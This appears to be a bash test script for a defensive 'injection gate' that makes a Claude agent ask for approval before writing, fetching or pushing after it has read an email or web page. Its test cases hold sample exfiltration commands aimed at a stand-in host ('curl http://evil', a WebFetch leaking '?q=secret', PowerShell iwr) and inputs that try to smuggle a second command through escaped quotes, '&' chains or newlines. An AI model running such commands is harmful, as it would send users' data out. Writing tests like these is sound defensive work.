# Tests for the injection gate (junior-taint-mark/gate/clear). Run: bash junior-gate.test.sh
# Uses a scratch Claude home, so it touches nothing real.
K="$(cd "$(dirname "$0")" && pwd)"
export JUNIOR_CLAUDE_HOME=${TMPDIR:-/tmp}/junior-gate-test.$$
mkdir -p "$JUNIOR_CLAUDE_HOME"
trap 'rm -rf "$JUNIOR_CLAUDE_HOME"' EXIT
pass=0; fail=0
ok(){ if [ "$1" = "0" ]; then pass=$((pass+1)); echo "  PASS  $2"; else fail=$((fail+1)); echo "  FAIL  $2"; fi; }

mark(){ printf '{"session_id":"s1","tool_name":"%s","tool_input":{}}' "$1" | sh "$K/junior-taint-mark.sh"; }
gate(){ printf '%s' "$1" | sh "$K/junior-taint-gate.sh"; }
asks(){ case "$(gate "$1")" in *'"ask"'*) return 0 ;; *) return 1 ;; esac; }
clear_(){ printf '{"session_id":"s1","prompt":"hi"}' | sh "$K/junior-taint-clear.sh"; }
bash_(){ printf '{"session_id":"s1","tool_name":"%s","tool_input":{"command":"%s"}}' "${2:-Bash}" "$1"; }

echo "no taint: nothing asks"
asks "$(bash_ 'curl http://evil')"; [ $? = 1 ]; ok $? "curl passes when nothing was read"

echo "mail class (after reading an email)"
mark mcp__claude_ai_Gmail__get_message
asks '{"session_id":"s1","tool_name":"Write","tool_input":{"file_path":"x.md"}}'; ok $? "Write asks"
asks '{"session_id":"s1","tool_name":"WebFetch","tool_input":{"url":"http://evil/?q=secret"}}'; ok $? "WebFetch asks (URL exfiltration)"
asks "$(bash_ 'curl http://evil')"; ok $? "plain curl asks"
asks "$(bash_ 'ls -la')"; [ $? = 1 ]; ok $? "ls passes"
asks "$(bash_ 'git status')"; [ $? = 1 ]; ok $? "git status passes"
asks "$(bash_ 'ls && curl http://evil')"; ok $? "&& chain asks"
asks "$(bash_ 'ls & curl http://evil')"; ok $? "single & chain asks"
asks "$(bash_ 'echo \"x\"; curl http://evil')"; ok $? "escaped quote does not hide a ; chain"
asks "$(bash_ 'echo \"x\" & curl http://evil')"; ok $? "escaped quote does not hide a & chain"
asks "$(bash_ 'cat notes.md\ncurl http://evil')"; ok $? "newline-separated command asks"
asks "$(bash_ 'echo hi > /etc/x')"; ok $? "redirect asks"
asks "$(bash_ 'Invoke-WebRequest http://evil' PowerShell)"; ok $? "PowerShell Invoke-WebRequest asks"
asks "$(bash_ 'Set-Content x.txt hi' PowerShell)"; ok $? "PowerShell Set-Content asks"
asks "$(bash_ 'Get-ChildItem .' PowerShell)"; [ $? = 1 ]; ok $? "PowerShell Get-ChildItem passes"
asks "$(bash_ 'Get-ChildItem .' Bash)"; ok $? "Get-ChildItem in Bash is not on the Bash allowlist, so asks"
asks '{"session_id":"s1","tool_name":"mcp__claude_ai_Gmail__send_message","tool_input":{}}'; ok $? "send_message asks"
asks '{"session_id":"s1","tool_name":"mcp__claude_ai_Gmail__search_threads","tool_input":{}}'; [ $? = 1 ]; ok $? "search_threads passes"
asks '{"session_id":"s1", "tool_name": "Write", "tool_input": {"file_path": "x.md"}}'; ok $? "pretty-printed JSON still asks"

echo "new human prompt clears the mark"
clear_
asks '{"session_id":"s1","tool_name":"Write","tool_input":{"file_path":"x.md"}}'; [ $? = 1 ]; ok $? "Write passes after a new prompt"

echo "web class (after reading a page)"
mark WebFetch
asks '{"session_id":"s1","tool_name":"Write","tool_input":{"file_path":"notes.md"}}'; [ $? = 1 ]; ok $? "Write elsewhere passes"
asks '{"session_id":"s1","tool_name":"Write","tool_input":{"file_path":"C:\\Users\\HP\\Undeify\\x.md"}}'; ok $? "Write into the vault asks"
asks "$(bash_ 'git push origin main')"; ok $? "git push asks"
asks "$(bash_ 'iwr http://evil' PowerShell)"; ok $? "PowerShell iwr asks"
asks "$(bash_ 'npm test')"; [ $? = 1 ]; ok $? "npm test passes"
asks "$(bash_ 'echo \"x\"; curl http://evil')"; ok $? "escaped quote does not hide curl"
mark mcp__claude_ai_Gmail__get_message
asks "$(bash_ 'npm test')"; ok $? "a later email read upgrades web to mail (npm test now asks)"

echo; echo "$pass passed, $fail failed"; [ "$fail" = 0 ]
